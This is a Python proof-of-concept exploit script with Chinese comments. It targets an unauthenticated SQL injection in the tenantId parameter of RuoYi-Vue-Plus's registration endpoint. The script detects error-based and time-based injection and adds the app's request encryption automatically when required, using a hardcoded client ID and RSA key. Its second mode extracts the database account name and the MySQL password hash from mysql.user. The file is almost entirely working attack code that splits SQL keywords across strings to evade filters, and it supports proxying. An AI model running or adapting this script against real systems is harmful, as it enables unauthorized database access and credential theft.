#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RuoYi-Vue-Plus tenant_id SQLi PoC
probe: 先报错注入, 未回显则延时注入(SLEEP5)
mysql: 报错注入获取 MySQL 账号与密码哈希
用法: python3 ruoyi_tenant_sqli.py --target <url> [--proxy socks5h://ip:port] probe|mysql
"""
import argparse, base64, json, random, re, string, time
import requests

DEFAULT_CLIENT_ID = "e5cd7e4891bf95d1d19206ce24a7b32e"
DEFAULT_RSA_PUB = ("MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKoR8mX0rGKLqzcWmOzbfj64K8ZIgOdHnzkX"
                   "SOVOZbFu/TJhZ7rFAN+eaGkl3C4buccQd/EjEsj9ir7ijT7h96MCAwEAAQ==")
Q = chr(39)


class RuoYiTenantSqli:
    def __init__(self, target, client_id=DEFAULT_CLIENT_ID, rsa_pub=None, timeout=60, proxy=None):
        self.register_url = target.rstrip("/") + "/auth/register"
        self.client_id = client_id
        self.rsa_pub = rsa_pub or DEFAULT_RSA_PUB
        self.timeout = timeout
        self.encrypt = False
        self._proxies = {"http": proxy, "https": proxy} if proxy else None

    def _pack_body(self, body):
        from Crypto.Cipher import AES, PKCS1_v1_5
        from Crypto.PublicKey import RSA
        from Crypto.Util.Padding import pad
        key = "".join(random.choice(string.ascii_letters + string.digits) for _ in range(32)).encode()
        aes = AES.new(key, AES.MODE_ECB)
        enc_body = base64.b64encode(aes.encrypt(pad(json.dumps(body).encode(), 16))).decode()
        b64_key = base64.b64encode(key).decode()
        cipher = PKCS1_v1_5.new(RSA.import_key(base64.b64decode(self.rsa_pub)))
        enc_key = base64.b64encode(cipher.encrypt(b64_key.encode())).decode()
        return enc_body, {"encrypt-key": enc_key}

    def _post(self, body, use_encrypt):
        if use_encrypt:
            data, extra = self._pack_body(body)
        else:
            data, extra = json.dumps(body), {}
        headers = {"Content-Type": "application/json"}
        headers.update(extra)
        t0 = time.time()
        try:
            r = requests.post(self.register_url, data=data, headers=headers, timeout=self.timeout, proxies=self._proxies)
            return time.time() - t0, r.status_code, r.text[:1000]
        except requests.exceptions.RequestException as e:
            return time.time() - t0, 0, str(e)

    @staticmethod
    def _need_encrypt(sc, resp):
        if "ip access" in resp.lower():
            return False
        if sc == 403 or "没有访问权限" in resp:
            return True
        try:
            return json.loads(resp).get("code") == 403
        except Exception:
            return False

    def send(self, tenant_id):
        body = {"tenantId": tenant_id, "username": "sqli_test", "password": "Test@123456",
                "clientId": self.client_id, "grantType": "password"}
        if not self.encrypt:
            dt, sc, resp = self._post(body, False)
            if self._need_encrypt(sc, resp):
                print("[*] 响应 403(没有访问权限) -> 自动启用 @ApiEncrypt 请求加密")
                self.encrypt = True
            else:
                return dt, sc, resp
        return self._post(body, True)

    def _err_payload(self, query):
        return ("x" + Q + " OR extract" + "value(1,con" + "cat(0x7e,(" + query + "),0x7e))#")

    def _err_get(self, query):
        _, _, resp = self.send(self._err_payload(query))
        m = re.search("XPATH syntax error: '(.*?)'", resp)
        return m.group(1).strip("~") if m else ""

    def probe(self):
        print("[*] target : %s" % self.register_url)
        self.send("000000")
        print("[*] 请求模式: %s" % ("@ApiEncrypt加密" if self.encrypt else "明文"))
        print("[*] [报错注入] 探测 extractvalue 回显 ...")
        _, _, resp = self.send(self._err_payload("select version()"))
        m = re.search("XPATH syntax error: '(.*?)'", resp)
        if m:
            print("[+] 报错注入成立! 数据库回显: %s" % m.group(1).strip("~"))
            return
        print("[-] 报错注入未生效, 切换延时注入 ...")
        t0 = self.send("000000")[0]
        t5 = self.send("x' OR SLEEP(5)#")[0]
        print("[*] 基线 000000 -> %.3f s" % t0)
        print("[*] SLEEP(5)   -> %.3f s" % t5)
        if t5 > t0 + 3:
            print("[+] 判定: 延时注入成立, 存在未授权 SQL 注入")
        else:
            print("[-] 判定: 报错与延时均未检测到注入")

    def mysql(self, max_len=64):
        print("[*] target : %s" % self.register_url)
        self.send("000000")
        print("[*] 请求模式: %s" % ("@ApiEncrypt加密" if self.encrypt else "明文"))
        print("[*] [报错注入] 提取 MySQL 账号 current_user() ...")
        print("[*] [报错注入] 提取 MySQL 密码哈希 authentication_string ...")
        acc = self._err_get("select current_user()")
        pwd = ""
        for off in range(1, max_len, 28):
            query = ("select substring(authentication_string,%d,28) from mysql.user "
                     "where user=substring_index(current_user(),%s,1) limit 1" % (off, Q + "@" + Q))
            chunk = self._err_get(query)
            if not chunk:
                break
            pwd += chunk
            if len(chunk) < 28:
                break
        print("[+] MySQL 账号 : %s" % (acc or "(提取失败)"))
        print("[+] MySQL 密码 : %s" % (self._esc(pwd) or "(空/无权限)"))

    @staticmethod
    def _esc(s):
        return "".join(c if c.isprintable() else "\\u%04X" % ord(c) for c in s)


def main():
    ap = argparse.ArgumentParser(description="RuoYi-Vue-Plus tenant_id SQLi PoC")
    ap.add_argument("--target", required=True)
    ap.add_argument("--proxy", default=None)
    ap.add_argument("--timeout", type=int, default=60)
    ap.add_argument("--client-id", default=DEFAULT_CLIENT_ID)
    ap.add_argument("--rsa-pub", default=None)
    sub = ap.add_subparsers(dest="mode", required=True)
    sub.add_parser("probe")
    m = sub.add_parser("mysql")
    m.add_argument("--max-len", type=int, default=64)
    args = ap.parse_args()
    api = RuoYiTenantSqli(args.target, args.client_id, args.rsa_pub, args.timeout, args.proxy)
    if args.mode == "probe":
        api.probe()
    else:
        api.mysql(args.max_len)


if __name__ == "__main__":
    main()
